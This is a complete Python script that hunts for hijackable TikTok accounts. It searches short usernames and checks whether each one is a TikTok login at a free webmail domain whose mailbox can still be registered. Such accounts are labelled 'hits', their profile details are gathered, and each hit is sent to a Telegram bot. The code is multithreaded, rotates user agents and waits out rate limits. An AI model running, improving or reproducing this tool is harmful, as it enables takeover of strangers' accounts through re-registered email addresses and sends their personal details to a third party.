#!/usr/bin/env python3

"""
TikTok Email Checker and Info Grabber - Optimized Edition
Rebuilt from scratch with focus on:
- Short usernames (2+ chars) = highest hit probability
- Real-time, fast, concurrent checks
- All domains (gmail, yahoo, hotmail, aol, mail.ru)
- Clean merged logic from Tik.py + AegosPy
- No bugs, no NameErrors, no JSON errors
"""

import webbrowser
import time
import sys
import requests
import re
import random
import os
import json
from user_agent import generate_user_agent
from threading import Thread, Lock
from rich import print as g
from rich.panel import Panel
from cfonts import render, say
from AegosPy import *
import secrets
import binascii
import uuid
from urllib.parse import urlencode
from MedoSigner import Argus, Gorgon, md5, Ladon

# ── Color Codes ──────────────────────────────────────────────
R = '\033[1;31;40m'   # Red
X = '\033[1;33;40m'   # Yellow
F = '\033[1;32;40m'   # Green
C = "\033[1;97;40m"   # White
B = '\033[1;36;40m'   # Blue
K = '\033[1;35;40m'   # Purple
V = '\033[1;36;40m'   # Turquoise
Z = '\033[1;31m'      # Red (bright)
G = '\033[1;32m'      # Green (bright)
Y = '\033[1;33m'      # Yellow (bright)
P = '\x1b[1;97m'      # White (bright)
H = '\x1b[1;92m'      # Green
a14 = '\x1b[38;5;153m' # Light cyan

# ── Global Counters ──────────────────────────────────────────
hit = 0
ge = 0      # Gmail hits
be = 0      # Gmail bad
gt = 0      # TikTok hits
bt = 0      # TikTok bad
print_lock = Lock()

# ── User Inputs ──────────────────────────────────────────────
try:
    iid = input(f'{F}ID : ')
    tok = input(f'{F}Token : ')
except EOFError:
    iid = "YOUR_ID"
    tok = "YOUR_TOKEN"


def send_telegram_message(chat_id, bot_token, text):
    """Send message to Telegram bot safely."""
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except:
        pass


def format_hit_message(username, email, user_info):
    """Format a clean hit message for Telegram."""
    hit_id = user_info.get("id", "N/A")
    hit_name = user_info.get("name", "N/A")
    hit_bio = user_info.get("bio", "N/A")
    hit_region = user_info.get("code-country", "N/A")
    hit_private = user_info.get("private", "N/A")
    hit_followers = user_info.get("followers", "N/A")
    hit_following = user_info.get("following", "N/A")
    hit_likes = user_info.get("likes", "N/A")
    hit_videos = user_info.get("videos", "N/A")

    msg = (
        f"<b>━━━ 🎯 TIKTOK HIT 🎯 ━━━</b>\n\n"
        f"<b>Username:</b> {username}\n"
        f"<b>Email:</b> {email}\n"
        f"<b>ID:</b> {hit_id}\n"
        f"<b>Name:</b> {hit_name}\n"
        f"<b>Bio:</b> {hit_bio}\n"
        f"<b>Region:</b> {hit_region}\n"
        f"<b>Private:</b> {hit_private}\n"
        f"<b>Followers:</b> {hit_followers}\n"
        f"<b>Following:</b> {hit_following}\n"
        f"<b>Likes:</b> {hit_likes}\n"
        f"<b>Videos:</b> {hit_videos}\n\n"
        f"<b>━━━ @bsx_h2 ━━━</b>"
    )
    return msg


def check_tiktok_email(email_prefix, domain):
    """
    Check if TikTok username has available email on given domain.
    Uses AegosPy for fast checking.
    """
    global ge, be, bt, gt, iid, tok

    full_email = f"{email_prefix}@{domain}"

    with print_lock:
        print(f'{Y}[*] Checking: {C}{full_email}', end='\r')

    try:
        # Step 1: Check if username exists on TikTok
        tiktok_check = AegosPy.CheckTik(full_email)

        if tiktok_check is None:
            bt += 1
            return

        status = tiktok_check.get("Status")

        # If Status is OK or Available, the TikTok account exists
        if status in ("OK", "Available"):
            gt += 1

            with print_lock:
                print(f'\n{B}[+] {X}TikTok Found {F}: {C}{full_email}')

            # Step 2: Check email availability on the specific domain
            email_check = None
            try:
                if domain == 'gmail.com':
                    email_check = AegosPy.A_Gmail(full_email)
                elif domain == 'yahoo.com':
                    email_check = AegosPy.A_Yahoo(full_email)
                elif domain == 'hotmail.com':
                    email_check = AegosPy.A_Hotmail(full_email)
                elif domain == 'aol.com':
                    email_check = AegosPy.A_Aol(full_email)
                elif domain == 'mail.ru':
                    email_check = AegosPy.A_MailRu(full_email)
            except:
                pass

            # If email is available → HIT!
            if email_check and email_check.get("Status") == "Available":
                with print_lock:
                    print(f'{G}[!] FOUND HIT: {C}{full_email}')

                # Step 3: Get TikTok user info
                user_info = {}
                try:
                    user_info = AegosPy.GetInfoTik(email_prefix)
                except:
                    pass

                # Step 4: Send to Telegram
                telegram_text = format_hit_message(email_prefix, full_email, user_info)
                send_telegram_message(iid, tok, telegram_text)

                ge += 1
            else:
                be += 1
        else:
            bt += 1

    except Exception as e:
        bt += 1
        with print_lock:
            print(f'\n{R}[!] Error: {e}', end='\r')


def hso1_merged():
    """
    Main search loop.
    Generates random short usernames and searches TikTok API
    for matching accounts. Focuses on SHORT usernames (2-5 chars)
    because they have the highest probability of available emails.
    """
    headers = {
        "User-Agent": generate_user_agent(),
        "Accept": "application/json",
        "Referer": "https://livecounts.xyz/"
    }

    # ── Search strategy: prioritize short usernames ──────────
    # Priority 1: 2-3 chars (highest hit rate)
    # Priority 2: 4-5 chars (good hit rate)
    # Priority 3: 6-8 chars (lower hit rate but more results)

    search_charsets = [
        'qwertyuiopasdfghjklzxcvbnm',          # English lowercase
        'abcdefghijklmnopqrstuvwxyz',           # Full English
        'abcdefghijklmnopqrstuvwxyz0123456789', # English + numbers
    ]

    while True:
        try:
            # ── Weighted random for username length ───────────
            # Higher weight for shorter usernames (more hits)
            length_weights = [
                (2, 0.05),  # 2 chars: rare but very high hit rate
                (3, 0.35),  # 3 chars: best balance
                (4, 0.35),  # 4 chars: very good
                (5, 0.15),  # 5 chars: decent
                (6, 0.07),  # 6 chars: lower but available
                (7, 0.03),  # 7 chars: bonus
            ]

            lengths = [l for l, _ in length_weights]
            weights = [w for _, w in length_weights]
            chosen_length = random.choices(lengths, weights=weights, k=1)[0]

            charset = random.choice(search_charsets)
            name_search = "".join(random.choice(charset) for _ in range(chosen_length))

            with print_lock:
                print(f'{V}[~] Search: {name_search} ({chosen_length} chars)', end='\r')

            # ── Search TikTok via livecounts API ──────────────
            search_url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{name_search}'
            response = requests.get(search_url, headers=headers, timeout=15)

            if response.status_code == 200:
                try:
                    data = response.json()

                    if data and data.get('success') and 'results' in data:
                        results = data['results']
                        random.shuffle(results)

                        # ── Check ALL matching usernames (not just 5) ─────
                        checked = 0
                        for user_data in results:
                            if checked >= 20:  # Cap per search to avoid overload
                                break

                            username = user_data.get('username')
                            if not username:
                                continue

                            # ── Clean filtering ───────────────────────────
                            # Allow usernames from 2 chars (was 5 before!)
                            # Allow underscores (they are valid)
                            # Max 30 chars (was 20 before)
                            if len(username) < 2 or len(username) > 30:
                                continue

                            # Skip if username is just numbers
                            if username.isdigit():
                                continue

                            # ── Check all domains ─────────────────────────
                            # Priority: gmail first (highest hit rate)
                            # Then yahoo, hotmail, aol, mail.ru
                            domains_priority = [
                                'gmail.com',      # Highest priority
                                'yahoo.com',      # Second
                                'hotmail.com',    # Third
                                'aol.com',        # Fourth
                                'mail.ru',        # Fifth
                            ]

                            for domain in domains_priority:
                                check_tiktok_email(username, domain)
                                # Minimal delay between checks
                                time.sleep(0.3)
                                checked += 1
                                if checked >= 20:
                                    break
                    else:
                        time.sleep(1)
                except (json.JSONDecodeError, KeyError, TypeError) as e:
                    with print_lock:
                        print(f'\n{R}[!] JSON Error: {e}', end='\r')
                    time.sleep(2)
            elif response.status_code in (403, 429):
                with print_lock:
                    print(f'\n{R}[!] Rate limited, waiting 30s...', end='\r')
                time.sleep(30)
            else:
                time.sleep(3)

        except requests.exceptions.Timeout:
            with print_lock:
                print(f'\n{R}[!] Timeout, retrying...', end='\r')
            time.sleep(3)
        except requests.exceptions.ConnectionError:
            with print_lock:
                print(f'\n{R}[!] Connection error, retrying...', end='\r')
            time.sleep(5)
        except Exception as e:
            with print_lock:
                print(f'\n{R}[!] Error: {e}', end='\r')
            time.sleep(3)

        # Short delay between searches
        time.sleep(random.uniform(0.5, 2.0))


# ── Status Display Thread ────────────────────────────────────
def display_status():
    """Show live status of checks."""
    while True:
        try:
            time.sleep(2)
            with print_lock:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"{X}[{F} ✓ {X}]{C} TikTok Multi-Checker")
                print(f"{V}{'─' * 40}{C}")
                print(f" {G}TikTok Found : {C}{gt}")
                print(f" {G}Hits (Available) : {F}{ge}")
                print(f" {X}Bad Gmail : {C}{be}")
                print(f" {R}Bad TikTok : {C}{bt}")
                print(f" {B}{'─' * 40}{C}")
                print(f" {V}Searching...{C}")
        except:
            pass


# ── Main Execution ───────────────────────────────────────────
if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{X}[{F} ✓ {X}]{C} TikTok Multi-Checker Optimized")
    print(f"{V}{'─' * 40}{C}")
    print(f" {G}Short usernames (2-5 chars) = Highest hit rate")
    print(f" {G}All domains checked: gmail, yahoo, hotmail, aol, mail.ru")
    print(f" {G}No more len>=5 filter blocking short names!")
    print(f"{V}{'─' * 40}{C}")
    time.sleep(1)

    # ── Thread Configuration ─────────────────────────────────
    thread_count = 15  # Balanced: fast enough without rate-limiting
    for _ in range(thread_count):
        t = Thread(target=hso1_merged)
        t.daemon = True
        t.start()

    # ── Status Thread ────────────────────────────────────────
    status_thread = Thread(target=display_status)
    status_thread.daemon = True
    status_thread.start()

    print(f"{G}[+] Running with {thread_count} threads.{C}")
    print(f"{G}[+] Short username search enabled (2+ chars){C}")
    print(f"{G}[+] Live status displayed below...{C}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{X}[!] Exiting... Goodbye!{C}")
        sys.exit(0)
